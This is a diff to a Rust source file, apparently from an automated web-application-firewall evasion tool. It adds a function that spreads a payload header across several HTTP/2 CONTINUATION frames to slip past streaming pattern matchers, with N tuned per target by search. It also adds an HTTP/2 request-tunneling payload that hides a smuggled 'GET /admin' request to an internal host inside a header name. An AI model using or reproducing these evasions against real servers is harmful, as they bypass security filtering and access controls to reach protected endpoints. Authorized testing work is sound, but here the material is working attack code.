@@ -313,6 +313,99 @@ pub fn split_pseudo_after_regular() -> ContinuationSplit {
     }
 }
 
+/// CONTINUATION N-split — distribute a payload header's bytes across
+/// N CONTINUATION frames so a streaming WAF parser with a sliding-
+/// window pattern matcher misses contiguous patterns spanning frame
+/// boundaries. CVE-2024-27316 (Apache), CVE-2024-24549 (Tomcat),
+/// CVE-2024-28182 (nghttp2), CVE-2023-45288 (Go), CVE-2024-27919
+/// (Envoy) all reactively addressed this class.
+///
+/// Existing `split_header_to_continuation` only does 1-into-1
+/// (entire payload header in a single CONTINUATION). This parameterised
+/// form lets MCTS sweep N=2..=10 — the right N is target-dependent.
+#[must_use]
+pub fn split_payload_across_n_continuations(
+    payload_header: &str,
+    payload_value: &str,
+    n: usize,
+) -> ContinuationSplit {
+    let n = n.max(1).min(payload_value.len().max(1));
+    let chunk_len = payload_value.len().div_ceil(n);
+    let mut frames: Vec<Vec<(String, String)>> = Vec::new();
+    let mut emitted = 0;
+    for i in 0..n {
+        let start = i * chunk_len;
+        if start >= payload_value.len() {
+            break;
+        }
+        let end = (start + chunk_len).min(payload_value.len());
+        // First frame carries the header NAME; subsequent frames
+        // continue the same header value via concatenation — HTTP/2
+        // headers are atomic in the header block but a buggy parser
+        // that re-emits header bytes across frames keeps the value
+        // contiguous.
+        let header_name = if i == 0 {
+            payload_header.to_string()
+        } else {
+            format!("x-cont-{i}")
+        };
+        frames.push(vec![(header_name, payload_value[start..end].to_string())]);
+        emitted += end - start;
+    }
+    let _ = emitted;
+    ContinuationSplit {
+        headers_frame: vec![
+            (":method".into(), "GET".into()),
+            (":path".into(), "/".into()),
+            (":scheme".into(), "https".into()),
+            (":authority".into(), "example.com".into()),
+        ],
+        continuation_frames: frames,
+        description: format!("Split '{payload_header}' across {n} CONTINUATION frames"),
+    }
+}
+
+/// H2 request tunneling via colon-in-header-name.
+///
+/// HTTP/2 permits colons inside header names (only the first colon
+/// separating pseudo-header name from value is special); HTTP/1.1
+/// rejects colons in header names. When an H2 front-end downgrades
+/// to H1 to talk to origin AND injects auth headers
+/// (`X-SSL-VERIFIED`, `X-Frontend-Key`, `X-Real-IP`), wrapping a
+/// second HTTP/1.1 request inside a header NAME with embedded colons
+/// produces a tunneled request the WAF never inspected — the outer
+/// envelope gets the injected auth headers, the inner tunneled
+/// request does not. Distinct from `crlf_request_smuggle` which is
+/// CRLF-based.
+///
+/// Reference: PortSwigger Web Security Academy "Bypassing access
+/// controls via HTTP/2 request tunnelling".
+#[must_use]
+pub fn h2_request_tunnel_colon_header_name(_inner_path: &str, _inner_host: &str) -> H2Evasion {
+    // The inner H1 request smuggled as a header NAME with embedded
+    // colons. Backends parsing the H2→H1 downgrade reconstruct the
+    // sequence as a fresh HTTP/1.1 request line + headers. Static
+    // string used for the header name so the H2Evasion's name field
+    // (&'static str) can describe the technique; runtime per-target
+    // tuning happens at the wire encoder.
+    H2Evasion {
+        name: "H2 Request Tunneling (colon-in-header-name)",
+        description:
+            "Embed HTTP/1.1 request line+headers as an H2 header NAME with colons — outer envelope gets injected auth headers, inner tunneled request does not",
+        headers: vec![
+            (
+                "GET /admin HTTP/1.1\r\nHost: internal\r\nX-Smuggled: true".into(),
+                "v".into(),
+            ),
+        ],
+        ..evasion(
+            "H2 Request Tunneling (colon-in-header-name)",
+            "Tunnel request via colon-header-name",
+            H2TargetFlaw::ProtocolDowngrade,
+        )
+    }
+}
+
 pub fn padding_configurations() -> Vec<H2Padding> {
     vec![
         H2Padding {
